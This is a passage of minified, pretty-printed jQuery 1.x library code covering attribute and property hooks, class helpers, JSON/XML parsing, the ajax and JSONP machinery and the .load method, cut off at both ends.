                  ? (o += "")
                  : f.isArray(o) &&
                    (o = f.map(o, function (t) {
                      return null == t ? "" : t + "";
                    })),
                ((e =
                  f.valHooks[this.type] ||
                  f.valHooks[this.nodeName.toLowerCase()]) &&
                  "set" in e &&
                  void 0 !== e.set(this, o, "value")) ||
                  (this.value = o));
            }))
          : o
          ? (e = f.valHooks[o.type] || f.valHooks[o.nodeName.toLowerCase()]) &&
            "get" in e &&
            void 0 !== (n = e.get(o, "value"))
            ? n
            : "string" == typeof (n = o.value)
            ? n.replace(he, "")
            : null == n
            ? ""
            : n
          : void 0;
      },
    }),
      f.extend({
        valHooks: {
          option: {
            get: function (t) {
              var e = f.find.attr(t, "value");
              return null != e ? e : f.trim(f.text(t)).replace(fe, " ");
            },
          },
          select: {
            get: function (t) {
              for (
                var e,
                  n,
                  i = t.options,
                  o = t.selectedIndex,
                  r = "select-one" === t.type || 0 > o,
                  s = r ? null : [],
                  a = r ? o + 1 : i.length,
                  l = 0 > o ? a : r ? o : 0;
                a > l;
                l++
              )
                if (
                  ((n = i[l]).selected || l === o) &&
                  (d.optDisabled
                    ? !n.disabled
                    : null === n.getAttribute("disabled")) &&
                  (!n.parentNode.disabled ||
                    !f.nodeName(n.parentNode, "optgroup"))
                ) {
                  if (((e = f(n).val()), r)) return e;
                  s.push(e);
                }
              return s;
            },
            set: function (t, e) {
              for (
                var n, i, o = t.options, r = f.makeArray(e), s = o.length;
                s--;

              )
                if (((i = o[s]), f.inArray(f.valHooks.option.get(i), r) > -1))
                  try {
                    i.selected = n = !0;
                  } catch (t) {
                    i.scrollHeight;
                  }
                else i.selected = !1;
              return n || (t.selectedIndex = -1), o;
            },
          },
        },
      }),
      f.each(["radio", "checkbox"], function () {
        (f.valHooks[this] = {
          set: function (t, e) {
            return f.isArray(e)
              ? (t.checked = f.inArray(f(t).val(), e) > -1)
              : void 0;
          },
        }),
          d.checkOn ||
            (f.valHooks[this].get = function (t) {
              return null === t.getAttribute("value") ? "on" : t.value;
            });
      });
    var pe,
      ge,
      me = f.expr.attrHandle,
      ve = /^(?:checked|selected)$/i,
      ye = d.getSetAttribute,
      be = d.input;
    f.fn.extend({
      attr: function (t, e) {
        return Y(this, f.attr, t, e, arguments.length > 1);
      },
      removeAttr: function (t) {
        return this.each(function () {
          f.removeAttr(this, t);
        });
      },
    }),
      f.extend({
        attr: function (t, e, n) {
          var i,
            o,
            r = t.nodeType;
          if (3 !== r && 8 !== r && 2 !== r)
            return void 0 === t.getAttribute
              ? f.prop(t, e, n)
              : ((1 === r && f.isXMLDoc(t)) ||
                  ((e = e.toLowerCase()),
                  (o =
                    f.attrHooks[e] || (f.expr.match.bool.test(e) ? ge : pe))),
                void 0 !== n
                  ? null === n
                    ? void f.removeAttr(t, e)
                    : o && "set" in o && void 0 !== (i = o.set(t, n, e))
                    ? i
                    : (t.setAttribute(e, n + ""), n)
                  : o && "get" in o && null !== (i = o.get(t, e))
                  ? i
                  : null == (i = f.find.attr(t, e))
                  ? void 0
                  : i);
        },
        attrHooks: {
          type: {
            set: function (t, e) {
              if (!d.radioValue && "radio" === e && f.nodeName(t, "input")) {
                var n = t.value;
                return t.setAttribute("type", e), n && (t.value = n), e;
              }
            },
          },
        },
        removeAttr: function (t, e) {
          var n,
            i,
            o = 0,
            r = e && e.match(j);
          if (r && 1 === t.nodeType)
            for (; (n = r[o++]); )
              (i = f.propFix[n] || n),
                f.expr.match.bool.test(n)
                  ? (be && ye) || !ve.test(n)
                    ? (t[i] = !1)
                    : (t[f.camelCase("default-" + n)] = t[i] = !1)
                  : f.attr(t, n, ""),
                t.removeAttribute(ye ? n : i);
        },
      }),
      (ge = {
        set: function (t, e, n) {
          return (
            !1 === e
              ? f.removeAttr(t, n)
              : (be && ye) || !ve.test(n)
              ? t.setAttribute((!ye && f.propFix[n]) || n, n)
              : (t[f.camelCase("default-" + n)] = t[n] = !0),
            n
          );
        },
      }),
      f.each(f.expr.match.bool.source.match(/\w+/g), function (t, e) {
        var n = me[e] || f.find.attr;
        (be && ye) || !ve.test(e)
          ? (me[e] = function (t, e, i) {
              var o, r;
              return (
                i ||
                  ((r = me[e]),
                  (me[e] = o),
                  (o = null != n(t, e, i) ? e.toLowerCase() : null),
                  (me[e] = r)),
                o
              );
            })
          : (me[e] = function (t, e, n) {
              return n
                ? void 0
                : t[f.camelCase("default-" + e)]
                ? e.toLowerCase()
                : null;
            });
      }),
      (be && ye) ||
        (f.attrHooks.value = {
          set: function (t, e, n) {
            return f.nodeName(t, "input")
              ? void (t.defaultValue = e)
              : pe && pe.set(t, e, n);
          },
        }),
      ye ||
        ((pe = {
          set: function (t, e, n) {
            var i = t.getAttributeNode(n);
            return (
              i || t.setAttributeNode((i = t.ownerDocument.createAttribute(n))),
              (i.value = e += ""),
              "value" === n || e === t.getAttribute(n) ? e : void 0
            );
          },
        }),
        (me.id =
          me.name =
          me.coords =
            function (t, e, n) {
              var i;
              return n
                ? void 0
                : (i = t.getAttributeNode(e)) && "" !== i.value
                ? i.value
                : null;
            }),
        (f.valHooks.button = {
          get: function (t, e) {
            var n = t.getAttributeNode(e);
            return n && n.specified ? n.value : void 0;
          },
          set: pe.set,
        }),
        (f.attrHooks.contenteditable = {
          set: function (t, e, n) {
            pe.set(t, "" !== e && e, n);
          },
        }),
        f.each(["width", "height"], function (t, e) {
          f.attrHooks[e] = {
            set: function (t, n) {
              return "" === n ? (t.setAttribute(e, "auto"), n) : void 0;
            },
          };
        })),
      d.style ||
        (f.attrHooks.style = {
          get: function (t) {
            return t.style.cssText || void 0;
          },
          set: function (t, e) {
            return (t.style.cssText = e + "");
          },
        });
    var _e = /^(?:input|select|textarea|button|object)$/i,
      we = /^(?:a|area)$/i;
    f.fn.extend({
      prop: function (t, e) {
        return Y(this, f.prop, t, e, arguments.length > 1);
      },
      removeProp: function (t) {
        return (
          (t = f.propFix[t] || t),
          this.each(function () {
            try {
              (this[t] = void 0), delete this[t];
            } catch (t) {}
          })
        );
      },
    }),
      f.extend({
        prop: function (t, e, n) {
          var i,
            o,
            r = t.nodeType;
          if (3 !== r && 8 !== r && 2 !== r)
            return (
              (1 === r && f.isXMLDoc(t)) ||
                ((e = f.propFix[e] || e), (o = f.propHooks[e])),
              void 0 !== n
                ? o && "set" in o && void 0 !== (i = o.set(t, n, e))
                  ? i
                  : (t[e] = n)
                : o && "get" in o && null !== (i = o.get(t, e))
                ? i
                : t[e]
            );
        },
        propHooks: {
          tabIndex: {
            get: function (t) {
              var e = f.find.attr(t, "tabindex");
              return e
                ? parseInt(e, 10)
                : _e.test(t.nodeName) || (we.test(t.nodeName) && t.href)
                ? 0
                : -1;
            },
          },
        },
        propFix: { for: "htmlFor", class: "className" },
      }),
      d.hrefNormalized ||
        f.each(["href", "src"], function (t, e) {
          f.propHooks[e] = {
            get: function (t) {
              return t.getAttribute(e, 4);
            },
          };
        }),
      d.optSelected ||
        (f.propHooks.selected = {
          get: function (t) {
            var e = t.parentNode;
            return (
              e &&
                (e.selectedIndex, e.parentNode && e.parentNode.selectedIndex),
              null
            );
          },
          set: function (t) {
            var e = t.parentNode;
            e && (e.selectedIndex, e.parentNode && e.parentNode.selectedIndex);
          },
        }),
      f.each(
        [
          "tabIndex",
          "readOnly",
          "maxLength",
          "cellSpacing",
          "cellPadding",
          "rowSpan",
          "colSpan",
          "useMap",
          "frameBorder",
          "contentEditable",
        ],
        function () {
          f.propFix[this.toLowerCase()] = this;
        }
      ),
      d.enctype || (f.propFix.enctype = "encoding");
    var xe = /[\t\r\n\f]/g;
    function Ee(t) {
      return f.attr(t, "class") || "";
    }
    f.fn.extend({
      addClass: function (t) {
        var e,
          n,
          i,
          o,
          r,
          s,
          a,
          l = 0;
        if (f.isFunction(t))
          return this.each(function (e) {
            f(this).addClass(t.call(this, e, Ee(this)));
          });
        if ("string" == typeof t && t)
          for (e = t.match(j) || []; (n = this[l++]); )
            if (
              ((o = Ee(n)),
              (i = 1 === n.nodeType && (" " + o + " ").replace(xe, " ")))
            ) {
              for (s = 0; (r = e[s++]); )
                i.indexOf(" " + r + " ") < 0 && (i += r + " ");
              o !== (a = f.trim(i)) && f.attr(n, "class", a);
            }
        return this;
      },
      removeClass: function (t) {
        var e,
          n,
          i,
          o,
          r,
          s,
          a,
          l = 0;
        if (f.isFunction(t))
          return this.each(function (e) {
            f(this).removeClass(t.call(this, e, Ee(this)));
          });
        if (!arguments.length) return this.attr("class", "");
        if ("string" == typeof t && t)
          for (e = t.match(j) || []; (n = this[l++]); )
            if (
              ((o = Ee(n)),
              (i = 1 === n.nodeType && (" " + o + " ").replace(xe, " ")))
            ) {
              for (s = 0; (r = e[s++]); )
                for (; i.indexOf(" " + r + " ") > -1; )
                  i = i.replace(" " + r + " ", " ");
              o !== (a = f.trim(i)) && f.attr(n, "class", a);
            }
        return this;
      },
      toggleClass: function (t, e) {
        var n = typeof t;
        return "boolean" == typeof e && "string" === n
          ? e
            ? this.addClass(t)
            : this.removeClass(t)
          : f.isFunction(t)
          ? this.each(function (n) {
              f(this).toggleClass(t.call(this, n, Ee(this), e), e);
            })
          : this.each(function () {
              var e, i, o, r;
              if ("string" === n)
                for (i = 0, o = f(this), r = t.match(j) || []; (e = r[i++]); )
                  o.hasClass(e) ? o.removeClass(e) : o.addClass(e);
              else
                (void 0 !== t && "boolean" !== n) ||
                  ((e = Ee(this)) && f._data(this, "__className__", e),
                  f.attr(
                    this,
                    "class",
                    e || !1 === t ? "" : f._data(this, "__className__") || ""
                  ));
            });
      },
      hasClass: function (t) {
        var e,
          n,
          i = 0;
        for (e = " " + t + " "; (n = this[i++]); )
          if (
            1 === n.nodeType &&
            (" " + Ee(n) + " ").replace(xe, " ").indexOf(e) > -1
          )
            return !0;
        return !1;
      },
    }),
      f.each(
        "blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(
          " "
        ),
        function (t, e) {
          f.fn[e] = function (t, n) {
            return arguments.length > 0
              ? this.on(e, null, t, n)
              : this.trigger(e);
          };
        }
      ),
      f.fn.extend({
        hover: function (t, e) {
          return this.mouseenter(t).mouseleave(e || t);
        },
      });
    var Te = t.location,
      Ce = f.now(),
      Ae = /\?/,
      ke =
        /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
    (f.parseJSON = function (e) {
      if (t.JSON && t.JSON.parse) return t.JSON.parse(e + "");
      var n,
        i = null,
        o = f.trim(e + "");
      return o &&
        !f.trim(
          o.replace(ke, function (t, e, o, r) {
            return (
              n && e && (i = 0),
              0 === i ? t : ((n = o || e), (i += !r - !o), "")
            );
          })
        )
        ? Function("return " + o)()
        : f.error("Invalid JSON: " + e);
    }),
      (f.parseXML = function (e) {
        var n;
        if (!e || "string" != typeof e) return null;
        try {
          t.DOMParser
            ? (n = new t.DOMParser().parseFromString(e, "text/xml"))
            : (((n = new t.ActiveXObject("Microsoft.XMLDOM")).async = "false"),
              n.loadXML(e));
        } catch (t) {
          n = void 0;
        }
        return (
          (n &&
            n.documentElement &&
            !n.getElementsByTagName("parsererror").length) ||
            f.error("Invalid XML: " + e),
          n
        );
      });
    var Se = /#.*$/,
      Le = /([?&])_=[^&]*/,
      De = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm,
      Ne = /^(?:GET|HEAD)$/,
      Oe = /^\/\//,
      je = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
      Pe = {},
      He = {},
      Me = "*/".concat("*"),
      ze = Te.href,
      Be = je.exec(ze.toLowerCase()) || [];
    function Ie(t) {
      return function (e, n) {
        "string" != typeof e && ((n = e), (e = "*"));
        var i,
          o = 0,
          r = e.toLowerCase().match(j) || [];
        if (f.isFunction(n))
          for (; (i = r[o++]); )
            "+" === i.charAt(0)
              ? ((i = i.slice(1) || "*"), (t[i] = t[i] || []).unshift(n))
              : (t[i] = t[i] || []).push(n);
      };
    }
    function $e(t, e, n, i) {
      var o = {},
        r = t === He;
      function s(a) {
        var l;
        return (
          (o[a] = !0),
          f.each(t[a] || [], function (t, a) {
            var c = a(e, n, i);
            return "string" != typeof c || r || o[c]
              ? r
                ? !(l = c)
                : void 0
              : (e.dataTypes.unshift(c), s(c), !1);
          }),
          l
        );
      }
      return s(e.dataTypes[0]) || (!o["*"] && s("*"));
    }
    function Re(t, e) {
      var n,
        i,
        o = f.ajaxSettings.flatOptions || {};
      for (i in e) void 0 !== e[i] && ((o[i] ? t : n || (n = {}))[i] = e[i]);
      return n && f.extend(!0, t, n), t;
    }
    function We(t) {
      return (t.style && t.style.display) || f.css(t, "display");
    }
    f.extend({
      active: 0,
      lastModified: {},
      etag: {},
      ajaxSettings: {
        url: ze,
        type: "GET",
        isLocal:
          /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(
            Be[1]
          ),
        global: !0,
        processData: !0,
        async: !0,
        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
        accepts: {
          "*": Me,
          text: "text/plain",
          html: "text/html",
          xml: "application/xml, text/xml",
          json: "application/json, text/javascript",
        },
        contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ },
        responseFields: {
          xml: "responseXML",
          text: "responseText",
          json: "responseJSON",
        },
        converters: {
          "* text": String,
          "text html": !0,
          "text json": f.parseJSON,
          "text xml": f.parseXML,
        },
        flatOptions: { url: !0, context: !0 },
      },
      ajaxSetup: function (t, e) {
        return e ? Re(Re(t, f.ajaxSettings), e) : Re(f.ajaxSettings, t);
      },
      ajaxPrefilter: Ie(Pe),
      ajaxTransport: Ie(He),
      ajax: function (e, n) {
        "object" == typeof e && ((n = e), (e = void 0)), (n = n || {});
        var i,
          o,
          r,
          s,
          a,
          l,
          c,
          u,
          d = f.ajaxSetup({}, n),
          h = d.context || d,
          p = d.context && (h.nodeType || h.jquery) ? f(h) : f.event,
          g = f.Deferred(),
          m = f.Callbacks("once memory"),
          v = d.statusCode || {},
          y = {},
          b = {},
          _ = 0,
          w = "canceled",
          x = {
            readyState: 0,
            getResponseHeader: function (t) {
              var e;
              if (2 === _) {
                if (!u)
                  for (u = {}; (e = De.exec(s)); ) u[e[1].toLowerCase()] = e[2];
                e = u[t.toLowerCase()];
              }
              return null == e ? null : e;
            },
            getAllResponseHeaders: function () {
              return 2 === _ ? s : null;
            },
            setRequestHeader: function (t, e) {
              var n = t.toLowerCase();
              return _ || ((t = b[n] = b[n] || t), (y[t] = e)), this;
            },
            overrideMimeType: function (t) {
              return _ || (d.mimeType = t), this;
            },
            statusCode: function (t) {
              var e;
              if (t)
                if (2 > _) for (e in t) v[e] = [v[e], t[e]];
                else x.always(t[x.status]);
              return this;
            },
            abort: function (t) {
              var e = t || w;
              return c && c.abort(e), E(0, e), this;
            },
          };
        if (
          ((g.promise(x).complete = m.add),
          (x.success = x.done),
          (x.error = x.fail),
          (d.url = ((e || d.url || ze) + "")
            .replace(Se, "")
            .replace(Oe, Be[1] + "//")),
          (d.type = n.method || n.type || d.method || d.type),
          (d.dataTypes = f
            .trim(d.dataType || "*")
            .toLowerCase()
            .match(j) || [""]),
          null == d.crossDomain &&
            ((i = je.exec(d.url.toLowerCase())),
            (d.crossDomain = !(
              !i ||
              (i[1] === Be[1] &&
                i[2] === Be[2] &&
                (i[3] || ("http:" === i[1] ? "80" : "443")) ===
                  (Be[3] || ("http:" === Be[1] ? "80" : "443")))
            ))),
          d.data &&
            d.processData &&
            "string" != typeof d.data &&
            (d.data = f.param(d.data, d.traditional)),
          $e(Pe, d, n, x),
          2 === _)
        )
          return x;
        for (o in ((l = f.event && d.global) &&
          0 == f.active++ &&
          f.event.trigger("ajaxStart"),
        (d.type = d.type.toUpperCase()),
        (d.hasContent = !Ne.test(d.type)),
        (r = d.url),
        d.hasContent ||
          (d.data &&
            ((r = d.url += (Ae.test(r) ? "&" : "?") + d.data), delete d.data),
          !1 === d.cache &&
            (d.url = Le.test(r)
              ? r.replace(Le, "$1_=" + Ce++)
              : r + (Ae.test(r) ? "&" : "?") + "_=" + Ce++)),
        d.ifModified &&
          (f.lastModified[r] &&
            x.setRequestHeader("If-Modified-Since", f.lastModified[r]),
          f.etag[r] && x.setRequestHeader("If-None-Match", f.etag[r])),
        ((d.data && d.hasContent && !1 !== d.contentType) || n.contentType) &&
          x.setRequestHeader("Content-Type", d.contentType),
        x.setRequestHeader(
          "Accept",
          d.dataTypes[0] && d.accepts[d.dataTypes[0]]
            ? d.accepts[d.dataTypes[0]] +
                ("*" !== d.dataTypes[0] ? ", " + Me + "; q=0.01" : "")
            : d.accepts["*"]
        ),
        d.headers))
          x.setRequestHeader(o, d.headers[o]);
        if (d.beforeSend && (!1 === d.beforeSend.call(h, x, d) || 2 === _))
          return x.abort();
        for (o in ((w = "abort"), { success: 1, error: 1, complete: 1 }))
          x[o](d[o]);
        if ((c = $e(He, d, n, x))) {
          if (((x.readyState = 1), l && p.trigger("ajaxSend", [x, d]), 2 === _))
            return x;
          d.async &&
            d.timeout > 0 &&
            (a = t.setTimeout(function () {
              x.abort("timeout");
            }, d.timeout));
          try {
            (_ = 1), c.send(y, E);
          } catch (t) {
            if (!(2 > _)) throw t;
            E(-1, t);
          }
        } else E(-1, "No Transport");
        function E(e, n, i, o) {
          var u,
            y,
            b,
            w,
            E,
            T = n;
          2 !== _ &&
            ((_ = 2),
            a && t.clearTimeout(a),
            (c = void 0),
            (s = o || ""),
            (x.readyState = e > 0 ? 4 : 0),
            (u = (e >= 200 && 300 > e) || 304 === e),
            i &&
              (w = (function (t, e, n) {
                for (
                  var i, o, r, s, a = t.contents, l = t.dataTypes;
                  "*" === l[0];

                )
                  l.shift(),
                    void 0 === o &&
                      (o = t.mimeType || e.getResponseHeader("Content-Type"));
                if (o)
                  for (s in a)
                    if (a[s] && a[s].test(o)) {
                      l.unshift(s);
                      break;
                    }
                if (l[0] in n) r = l[0];
                else {
                  for (s in n) {
                    if (!l[0] || t.converters[s + " " + l[0]]) {
                      r = s;
                      break;
                    }
                    i || (i = s);
                  }
                  r = r || i;
                }
                return r ? (r !== l[0] && l.unshift(r), n[r]) : void 0;
              })(d, x, i)),
            (w = (function (t, e, n, i) {
              var o,
                r,
                s,
                a,
                l,
                c = {},
                u = t.dataTypes.slice();
              if (u[1])
                for (s in t.converters) c[s.toLowerCase()] = t.converters[s];
              for (r = u.shift(); r; )
                if (
                  (t.responseFields[r] && (n[t.responseFields[r]] = e),
                  !l && i && t.dataFilter && (e = t.dataFilter(e, t.dataType)),
                  (l = r),
                  (r = u.shift()))
                )
                  if ("*" === r) r = l;
                  else if ("*" !== l && l !== r) {
                    if (!(s = c[l + " " + r] || c["* " + r]))
                      for (o in c)
                        if (
                          (a = o.split(" "))[1] === r &&
                          (s = c[l + " " + a[0]] || c["* " + a[0]])
                        ) {
                          !0 === s
                            ? (s = c[o])
                            : !0 !== c[o] && ((r = a[0]), u.unshift(a[1]));
                          break;
                        }
                    if (!0 !== s)
                      if (s && t.throws) e = s(e);
                      else
                        try {
                          e = s(e);
                        } catch (t) {
                          return {
                            state: "parsererror",
                            error: s
                              ? t
                              : "No conversion from " + l + " to " + r,
                          };
                        }
                  }
              return { state: "success", data: e };
            })(d, w, x, u)),
            u
              ? (d.ifModified &&
                  ((E = x.getResponseHeader("Last-Modified")) &&
                    (f.lastModified[r] = E),
                  (E = x.getResponseHeader("etag")) && (f.etag[r] = E)),
                204 === e || "HEAD" === d.type
                  ? (T = "nocontent")
                  : 304 === e
                  ? (T = "notmodified")
                  : ((T = w.state), (y = w.data), (u = !(b = w.error))))
              : ((b = T), (!e && T) || ((T = "error"), 0 > e && (e = 0))),
            (x.status = e),
            (x.statusText = (n || T) + ""),
            u ? g.resolveWith(h, [y, T, x]) : g.rejectWith(h, [x, T, b]),
            x.statusCode(v),
            (v = void 0),
            l && p.trigger(u ? "ajaxSuccess" : "ajaxError", [x, d, u ? y : b]),
            m.fireWith(h, [x, T]),
            l &&
              (p.trigger("ajaxComplete", [x, d]),
              --f.active || f.event.trigger("ajaxStop")));
        }
        return x;
      },
      getJSON: function (t, e, n) {
        return f.get(t, e, n, "json");
      },
      getScript: function (t, e) {
        return f.get(t, void 0, e, "script");
      },
    }),
      f.each(["get", "post"], function (t, e) {
        f[e] = function (t, n, i, o) {
          return (
            f.isFunction(n) && ((o = o || i), (i = n), (n = void 0)),
            f.ajax(
              f.extend(
                { url: t, type: e, dataType: o, data: n, success: i },
                f.isPlainObject(t) && t
              )
            )
          );
        };
      }),
      (f._evalUrl = function (t) {
        return f.ajax({
          url: t,
          type: "GET",
          dataType: "script",
          cache: !0,
          async: !1,
          global: !1,
          throws: !0,
        });
      }),
      f.fn.extend({
        wrapAll: function (t) {
          if (f.isFunction(t))
            return this.each(function (e) {
              f(this).wrapAll(t.call(this, e));
            });
          if (this[0]) {
            var e = f(t, this[0].ownerDocument).eq(0).clone(!0);
            this[0].parentNode && e.insertBefore(this[0]),
              e
                .map(function () {
                  for (
                    var t = this;
                    t.firstChild && 1 === t.firstChild.nodeType;

                  )
                    t = t.firstChild;
                  return t;
                })
                .append(this);
          }
          return this;
        },
        wrapInner: function (t) {
          return f.isFunction(t)
            ? this.each(function (e) {
                f(this).wrapInner(t.call(this, e));
              })
            : this.each(function () {
                var e = f(this),
                  n = e.contents();
                n.length ? n.wrapAll(t) : e.append(t);
              });
        },
        wrap: function (t) {
          var e = f.isFunction(t);
          return this.each(function (n) {
            f(this).wrapAll(e ? t.call(this, n) : t);
          });
        },
        unwrap: function () {
          return this.parent()
            .each(function () {
              f.nodeName(this, "body") || f(this).replaceWith(this.childNodes);
            })
            .end();
        },
      }),
      (f.expr.filters.hidden = function (t) {
        return d.reliableHiddenOffsets()
          ? t.offsetWidth <= 0 &&
              t.offsetHeight <= 0 &&
              !t.getClientRects().length
          : (function (t) {
              if (!f.contains(t.ownerDocument || i, t)) return !0;
              for (; t && 1 === t.nodeType; ) {
                if ("none" === We(t) || "hidden" === t.type) return !0;
                t = t.parentNode;
              }
              return !1;
            })(t);
      }),
      (f.expr.filters.visible = function (t) {
        return !f.expr.filters.hidden(t);
      });
    var qe = /%20/g,
      Fe = /\[\]$/,
      Ue = /\r?\n/g,
      Xe = /^(?:submit|button|image|reset|file)$/i,
      Ve = /^(?:input|select|textarea|keygen)/i;
    function Ye(t, e, n, i) {
      var o;
      if (f.isArray(e))
        f.each(e, function (e, o) {
          n || Fe.test(t)
            ? i(t, o)
            : Ye(
                t + "[" + ("object" == typeof o && null != o ? e : "") + "]",
                o,
                n,
                i
              );
        });
      else if (n || "object" !== f.type(e)) i(t, e);
      else for (o in e) Ye(t + "[" + o + "]", e[o], n, i);
    }
    (f.param = function (t, e) {
      var n,
        i = [],
        o = function (t, e) {
          (e = f.isFunction(e) ? e() : null == e ? "" : e),
            (i[i.length] = encodeURIComponent(t) + "=" + encodeURIComponent(e));
        };
      if (
        (void 0 === e && (e = f.ajaxSettings && f.ajaxSettings.traditional),
        f.isArray(t) || (t.jquery && !f.isPlainObject(t)))
      )
        f.each(t, function () {
          o(this.name, this.value);
        });
      else for (n in t) Ye(n, t[n], e, o);
      return i.join("&").replace(qe, "+");
    }),
      f.fn.extend({
        serialize: function () {
          return f.param(this.serializeArray());
        },
        serializeArray: function () {
          return this.map(function () {
            var t = f.prop(this, "elements");
            return t ? f.makeArray(t) : this;
          })
            .filter(function () {
              var t = this.type;
              return (
                this.name &&
                !f(this).is(":disabled") &&
                Ve.test(this.nodeName) &&
                !Xe.test(t) &&
                (this.checked || !K.test(t))
              );
            })
            .map(function (t, e) {
              var n = f(this).val();
              return null == n
                ? null
                : f.isArray(n)
                ? f.map(n, function (t) {
                    return { name: e.name, value: t.replace(Ue, "\r\n") };
                  })
                : { name: e.name, value: n.replace(Ue, "\r\n") };
            })
            .get();
        },
      }),
      (f.ajaxSettings.xhr =
        void 0 !== t.ActiveXObject
          ? function () {
              return this.isLocal
                ? Je()
                : i.documentMode > 8
                ? Ze()
                : (/^(get|post|head|put|delete|options)$/i.test(this.type) &&
                    Ze()) ||
                  Je();
            }
          : Ze);
    var Ke = 0,
      Qe = {},
      Ge = f.ajaxSettings.xhr();
    function Ze() {
      try {
        return new t.XMLHttpRequest();
      } catch (t) {}
    }
    function Je() {
      try {
        return new t.ActiveXObject("Microsoft.XMLHTTP");
      } catch (t) {}
    }
    t.attachEvent &&
      t.attachEvent("onunload", function () {
        for (var t in Qe) Qe[t](void 0, !0);
      }),
      (d.cors = !!Ge && "withCredentials" in Ge),
      (Ge = d.ajax = !!Ge) &&
        f.ajaxTransport(function (e) {
          var n;
          if (!e.crossDomain || d.cors)
            return {
              send: function (i, o) {
                var r,
                  s = e.xhr(),
                  a = ++Ke;
                if (
                  (s.open(e.type, e.url, e.async, e.username, e.password),
                  e.xhrFields)
                )
                  for (r in e.xhrFields) s[r] = e.xhrFields[r];
                for (r in (e.mimeType &&
                  s.overrideMimeType &&
                  s.overrideMimeType(e.mimeType),
                e.crossDomain ||
                  i["X-Requested-With"] ||
                  (i["X-Requested-With"] = "XMLHttpRequest"),
                i))
                  void 0 !== i[r] && s.setRequestHeader(r, i[r] + "");
                s.send((e.hasContent && e.data) || null),
                  (n = function (t, i) {
                    var r, l, c;
                    if (n && (i || 4 === s.readyState))
                      if (
                        (delete Qe[a],
                        (n = void 0),
                        (s.onreadystatechange = f.noop),
                        i)
                      )
                        4 !== s.readyState && s.abort();
                      else {
                        (c = {}),
                          (r = s.status),
                          "string" == typeof s.responseText &&
                            (c.text = s.responseText);
                        try {
                          l = s.statusText;
                        } catch (t) {
                          l = "";
                        }
                        r || !e.isLocal || e.crossDomain
                          ? 1223 === r && (r = 204)
                          : (r = c.text ? 200 : 404);
                      }
                    c && o(r, l, c, s.getAllResponseHeaders());
                  }),
                  e.async
                    ? 4 === s.readyState
                      ? t.setTimeout(n)
                      : (s.onreadystatechange = Qe[a] = n)
                    : n();
              },
              abort: function () {
                n && n(void 0, !0);
              },
            };
        }),
      f.ajaxSetup({
        accepts: {
          script:
            "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
        },
        contents: { script: /\b(?:java|ecma)script\b/ },
        converters: {
          "text script": function (t) {
            return f.globalEval(t), t;
          },
        },
      }),
      f.ajaxPrefilter("script", function (t) {
        void 0 === t.cache && (t.cache = !1),
          t.crossDomain && ((t.type = "GET"), (t.global = !1));
      }),
      f.ajaxTransport("script", function (t) {
        if (t.crossDomain) {
          var e,
            n = i.head || f("head")[0] || i.documentElement;
          return {
            send: function (o, r) {
              ((e = i.createElement("script")).async = !0),
                t.scriptCharset && (e.charset = t.scriptCharset),
                (e.src = t.url),
                (e.onload = e.onreadystatechange =
                  function (t, n) {
                    (n ||
                      !e.readyState ||
                      /loaded|complete/.test(e.readyState)) &&
                      ((e.onload = e.onreadystatechange = null),
                      e.parentNode && e.parentNode.removeChild(e),
                      (e = null),
                      n || r(200, "success"));
                  }),
                n.insertBefore(e, n.firstChild);
            },
            abort: function () {
              e && e.onload(void 0, !0);
            },
          };
        }
      });
    var tn = [],
      en = /(=)\?(?=&|$)|\?\?/;
    f.ajaxSetup({
      jsonp: "callback",
      jsonpCallback: function () {
        var t = tn.pop() || f.expando + "_" + Ce++;
        return (this[t] = !0), t;
      },
    }),
      f.ajaxPrefilter("json jsonp", function (e, n, i) {
        var o,
          r,
          s,
          a =
            !1 !== e.jsonp &&
            (en.test(e.url)
              ? "url"
              : "string" == typeof e.data &&
                0 ===
                  (e.contentType || "").indexOf(
                    "application/x-www-form-urlencoded"
                  ) &&
                en.test(e.data) &&
                "data");
        return a || "jsonp" === e.dataTypes[0]
          ? ((o = e.jsonpCallback =
              f.isFunction(e.jsonpCallback)
                ? e.jsonpCallback()
                : e.jsonpCallback),
            a
              ? (e[a] = e[a].replace(en, "$1" + o))
              : !1 !== e.jsonp &&
                (e.url += (Ae.test(e.url) ? "&" : "?") + e.jsonp + "=" + o),
            (e.converters["script json"] = function () {
              return s || f.error(o + " was not called"), s[0];
            }),
            (e.dataTypes[0] = "json"),
            (r = t[o]),
            (t[o] = function () {
              s = arguments;
            }),
            i.always(function () {
              void 0 === r ? f(t).removeProp(o) : (t[o] = r),
                e[o] && ((e.jsonpCallback = n.jsonpCallback), tn.push(o)),
                s && f.isFunction(r) && r(s[0]),
                (s = r = void 0);
            }),
            "script")
          : void 0;
      }),
      (f.parseHTML = function (t, e, n) {
        if (!t || "string" != typeof t) return null;
        "boolean" == typeof e && ((n = e), (e = !1)), (e = e || i);
        var o = E.exec(t),
          r = !n && [];
        return o
          ? [e.createElement(o[1])]
          : ((o = at([t], e, r)),
            r && r.length && f(r).remove(),
            f.merge([], o.childNodes));
      });
    var nn = f.fn.load;
    function on(t) {
      return f.isWindow(t)
        ? t
        : 9 === t.nodeType && (t.defaultView || t.parentWindow);
    }
    (f.fn.load = function (t, e, n) {
      if ("string" != typeof t && nn) return nn.apply(this, arguments);
      var i,
        o,
        r,
        s = this,
        a = t.indexOf(" ");
      return (
        a > -1 && ((i = f.trim(t.slice(a, t.length))), (t = t.slice(0, a))),
        f.isFunction(e)
          ? ((n = e), (e = void 0))
          : e && "object" == typeof e && (o = "POST"),
        s.length > 0 &&
          f
            .ajax({ url: t, type: o || "GET", dataType: "html", data: e })
            .done(function (t) {
              (r = arguments),
                s.html(i ? f("<div>").append(f.parseHTML(t)).find(i) : t);
            })
            .always(
              n &&
                function (t, e) {
                  s.each(function () {
                    n.apply(this, r || [t.responseText, e, t]);
                  });
                }
            ),
        this
      );
    }),
      f.each(
        [
          "ajaxStart",
